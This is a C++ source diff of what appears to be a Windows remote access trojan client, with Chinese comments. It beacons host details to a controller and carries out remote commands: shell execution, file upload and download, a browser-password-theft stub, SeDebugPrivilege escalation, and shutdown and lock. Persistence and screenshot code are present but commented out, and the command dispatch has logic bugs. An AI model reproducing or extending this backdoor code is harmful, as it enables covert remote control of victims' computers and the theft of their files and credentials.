@@ -4,22 +4,25 @@ int GetPCMessage(SOCKET fd);//获取计算机基本信息
 
 int FileBrowse(SOCKET fd);//文件浏览
 
-int FileUplode(SOCKET fd);//文件上传
+int recvFile(SOCKET fd, char* buf);//文件下载
 
-int FileDownload(SOCKET fd);//文件下载
+int sendFile(SOCKET fd, char* buf);//文件上传
 
-int Shell(SOCKET fd);//执行shell指令
+int Shell(SOCKET fd, char* buf);//执行shell指令
 
-void SendScreenShot(SOCKET fd);//获取屏幕截图并且发送
+//void SendScreenShot(SOCKET fd);//获取屏幕截图并且发送
 
 int GetPassword(SOCKET fd);//获取浏览器密码
 
+bool UpPrivilegeValue();//提权操作
+
 int main()
 {
-	//设置程序开机自启
-	char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
+	//char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
 
-	ComputerStart(pathName);
+	//copySelf(pathName);//将文件复制到系统目录
+
+	//ComputerStart(pathName);//设置程序开机自启
 
 	init_Socket();//创建客户端socket
 
@@ -29,47 +32,96 @@ int main()
 	encode(str);
 	send(fd, str, strlen(str), 0);
 
+	GetPCMessage(fd);//将PC信息发送给服务端
+
 	HeartBeat(fd);//心跳功能
 
-	char command;//存储接收的指令
-
-	thread th1 = thread(GetPCMessage, fd);
-	thread th2 = thread(FileBrowse, fd);
-	thread th3 = thread(Shell, fd);
-	thread th4 = thread(FileUplode, fd);
-	thread th5 = thread(FileDownload, fd);
-	thread th6 = thread(SendScreenShot, fd);
-	thread th7 = thread(GetPassword, fd);
+	char command[16] = {0};//存储接收的指令
+	char recvbuf[BUFSIZ] = { 0 };//接收信息的缓冲区
+	//创建对应的线程，需要使用时就加入
 	while (true)
 	{
-		recv(fd, &command, 1, 0);
-		switch (command)
+		recv(fd, command, 16, 0);
+		decode(command);
+		if (strcmp(command, "filebrowse"))
 		{
-		case 1:
+			thread th1 = thread(FileBrowse, fd);
 			th1.join();
-			break;
-		case 2:
-			th2.join();
-			break;
-		case 3:
-			th3.join();
-			break;
-		case 4:
-			th4.join();
-			break;
-		case 5:
-			th5.join();
-			break;
-		case 6:
-			th6.join();
-			break;
-		case 7:
-			th7.join();
-			break;
-		default:
-			send(fd, "Error code", strlen("Error code"), 0);
-			break;
+			continue;
 		}
+		else if (strcmp(command, "shell"))
+		{
+			thread th2 = thread(Shell, fd, recvbuf);
+			th2.join();
+			continue;
+		}
+		else if(strcmp(command, "download"))
+		{
+			thread th3 = thread(sendFile, fd, recvbuf);
+			th3.join();
+			continue;
+		}
+		else if (strcmp(command, "upload"))
+		{
+			thread th4 = thread(recvFile, fd, recvbuf);
+			th4.join();
+			continue;
+		}
+		//else if (strcmp(command, "scrennshot"))
+		//{
+		//	//CaptureImage(GetDesktopWindow(), "./", "screen"); //保存screen.jpg
+		//	thread th5 = thread(SendScreenShot, fd);
+		//	th5.join();
+		//	continue;
+		//}
+		else if (strcmp(command, "getpassword"))
+		{
+			thread th6 = thread(GetPassword, fd);
+			th6.join();
+			continue;
+		}
+		else if(strcmp(command, "upright"))
+		{
+			thread th7 = thread(UpPrivilegeValue);
+			th7.join();
+			continue;
+		}
+		else if (strcmp(command, "kill"))
+		{
+			char text[] = "Client has exit!";
+			encode(text);
+			send(fd, text, strlen(text), 0);//关闭客户端
+			exit(0);
+			continue;
+		}
+		else if (strcmp(command, "kill"))
+		{
+			system("shutdown -s -t 1");//关机
+			continue;
+		}
+		else if (strcmp(command, "reboot"))
+		{
+			system("shutdown -r -t 10"); //重启
+			continue;
+		}
+		else if (strcmp(command, "cancel"))
+		{
+			system("shutdown -a");//取消关机
+			continue;
+		}
+		else if (strcmp(command, "lock"))
+		{
+			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//锁屏
+			continue;
+		}
+		else
+		{
+			send(fd, "Error code", strlen("Error code"), 0);//发送指令错误
+			continue;
+		}
+		ZeroMemory(recvbuf, sizeof(recvbuf));//初始化
+		ZeroMemory(command, sizeof(command));//初始化
+		Sleep(2000);
 	}
 	closesocket(fd);//关闭客户端socket
 
@@ -90,27 +142,25 @@ int GetPCMessage(SOCKET fd)
 	TcharToChar(msg.UserName, UserName);//将TCHAR转换为char
 
 	encode(msg.PCName);//加密
-	cout << msg.PCName << endl;
-
+	//cout << msg.PCName << endl;
 	encode(UserName);
-	cout << msg.UserName << endl;
-
+	//cout << msg.UserName << endl;
 	encode(msg.IP);
-	cout << msg.IP << endl;
+	//cout << msg.IP << endl;
 
 	if (send(fd, msg.PCName, strlen(msg.PCName), 0) == INVALID_SOCKET)//发送相应的计算机信息
 	{
-		err("send");
+		//err("send");
 	}
 	recv(fd, &block, 1, 0);			//接受一个字符防止粘包
 	if (send(fd, UserName, strlen(UserName), 0) == INVALID_SOCKET)
 	{
-		err("send");
+		//err("send");
 	}
 	recv(fd, &block, 1, 0);
 	if (send(fd, msg.IP, strlen(msg.IP), 0) == INVALID_SOCKET)
 	{
-		err("send");
+		//err("send");
 	}
 	recv(fd, &block, 1, 0);
 
@@ -134,73 +184,151 @@ int FileBrowse(SOCKET fd)
 	return 0;
 }
 
-int FileDownload(SOCKET fd)
+int sendFile(SOCKET fd, char* buf)
 {
-	char FileName[BUFSIZ] = { 0 };
-	recv(fd, FileName, BUFSIZ, 0);//接收要下载的文件名（绝对路径）
-	char File[BUFSIZ * 2] = { 0 };
-	FILE* fp = fopen(FileName, "r");
-	if (fp == NULL)
+	ZeroMemory(buf, sizeof(buf));
+	recv(fd, buf, BUFSIZ, 0);//接收要下载的文件名（绝对路径）
+	char sendbuf[BUFSIZ * 2];
+	DWORD dwRead;
+	BOOL bRet;
+	Sleep(200);
+
+	HANDLE hFile = CreateFile((LPCWSTR)buf, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	if (hFile == INVALID_HANDLE_VALUE) 
 	{
-		send(fd, "false", strlen("false"), 0);
+		return 1;
+	}
+	while (true) 
+	{   //发送文件的buf
+		bRet = ReadFile(hFile, sendbuf, 1024, &dwRead, NULL);
+		if (bRet == FALSE)
+		{
+			break;
+		}
+		else if (dwRead == 0) 
+		{
+			Sleep(100);
+			break;
+		}
+		else 
+		{
+			send(fd, sendbuf, dwRead, 0);
+		}
+	}
+	char res[] = "success";
+	encode(res);
+	send(fd, res, strlen(res) + 1, 0);
+	return 0;
+}
+
+int recvFile(SOCKET fd, char* buf)//文件下载
+{
+	ZeroMemory(buf, sizeof(buf));
+	recv(fd, buf, BUFSIZ, 0);//接受要上传文件的绝对路径
+	int len;
+	char recvBuf[1024] = { 0 };   // 缓冲区
+	HANDLE hFile;               // 文件句柄
+	DWORD count;                // 写入的数据计数
+
+	hFile = CreateFile((LPCWSTR)buf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) 
+	{
+		return 1;
+	}
+	char begin[] = "BEGIN";
+	encode(begin);
+	send(fd, begin, strlen(begin), 0);
+	while (true) 
+	{
+		// 从客户端读数据
+		ZeroMemory(recvBuf, sizeof(recvBuf));
+		len = recv(fd, recvBuf, 1024, 0);
+		decode(recvBuf);
+		if (strlen(recvBuf) < 5) 
+		{
+			if (strcmp(recvBuf, "EOF") == 0) {
+				CloseHandle(hFile);
+				break;
+			}
+		}
+		WriteFile(hFile, recvBuf, len, &count, 0);
+	}
+	Sleep(500);
+	char RECV[] = "RECV";
+	encode(RECV);
+	send(fd, RECV, strlen(RECV), 0);
+	return 0;
+}
+
+int Shell(SOCKET fd, char* buf)
+{
+	char shell[40] = { 0 };
+	char res[BUFSIZ * 2] = { 0 };
+	ZeroMemory(buf, sizeof(buf));
+	recv(fd, buf, strlen(buf), 0);	//接收发送来的shell指令
+	decode(buf);
+	for (int i = 1; buf[i] != '\0'; i++) 
+	{
+		shell[i - 1] = buf[i];
+	}
+	if (!cmd(shell, res)) 
+	{
+		send(fd, res, strlen(res) + 1, 0);
 	}
 	else
 	{
-		while (!feof(fp))//读文件，直到末尾
-		{
-			fread(File, sizeof(unsigned __int8), 1, fp);//向File中写入
-			send(fd, File, strlen(File), 0);//发送
-			memset(File, 0, BUFSIZ * 2);//重置数组
-		}
+		char text[] = "CMD Error!";
+		encode(text);
+		send(fd, text, strlen(text), 0);
 	}
 	return 0;
 }
 
-int FileUplode(SOCKET fd)
-{
-	char FileName[BUFSIZ] = { 0 };//接受文件名和路径的缓冲区
-	//提示由服务端提供
-	recv(fd, FileName, BUFSIZ, 0);//接受要上传文件的绝对路径
-
-	FILE* fp = fopen(FileName, "wb");  //以二进制方式打开（创建）文件
-	if (fp == NULL)
-	{
-		send(fd, "false", strlen("false"), 0);
-	}
-	else
-	{
-		char buffer[BUFSIZ * 2] = { 0 };  //文件缓冲区
-		int nCount;
-		while ((nCount = recv(fd, buffer, BUFSIZ * 2, 0)) > 0)
-		{
-			fwrite(buffer, nCount, 1, fp);//向文件中写入数据
-		}
-		send(fd, "success!", strlen("success!"), 0);
-	}
-	fclose(fp);//传输完成后关闭文件
-	return 0;
-}
-
-int Shell(SOCKET fd)
-{
-	char shell[BUFSIZ * 4] = { 0 };
-	char res[BUFSIZ * 4] = { 0 };
-
-	recv(fd, shell, strlen(shell), 0);	//接收发送来的shell指令
-	Execmd(shell, res);					//执行shell指令
-	send(fd, res, strlen(res), 0);		//发送执行后的结果
-	return 0;
-}
-
-void SendScreenShot(SOCKET fd)
-{
-	//保存桌面截图至str指向的位置
-	const char* str = "D:";
-	ScreenShot((LPCTSTR)(CString)str);
-	readSrc();
-}
+//void SendScreenShot(SOCKET fd)
+//{
+//	//保存桌面截图至str指向的位置
+//	const char* str = "C:\\Windows\\Screenshots.bmp";
+//	ScreenShot((LPCTSTR)(CString)str);
+//	readSrc(fd);
+//}
 
 int GetPassword(SOCKET fd)
 {
 	return 0;
+}
+
+bool UpPrivilegeValue()
+{
+	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
+	HANDLE hToken = nullptr;
+	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
+	{
+		return false;
+	}
+	//LookupPrivilegeValue()函数查看系统权限的特权值
+	LUID luid;
+	if (FALSE == LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
+	{
+		CloseHandle(hToken);
+		return false;
+	}
+	//调整权限设置
+	TOKEN_PRIVILEGES Tok;
+	Tok.PrivilegeCount = 1;
+	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	Tok.Privileges[0].Luid = luid;
+	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), nullptr, nullptr))
+	{
+		CloseHandle(hToken);
+		return false;
+	}
+
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+	{
+		CloseHandle(hToken);
+		return false;
+	}
+
+	CloseHandle(hToken);
+	return true;
 }
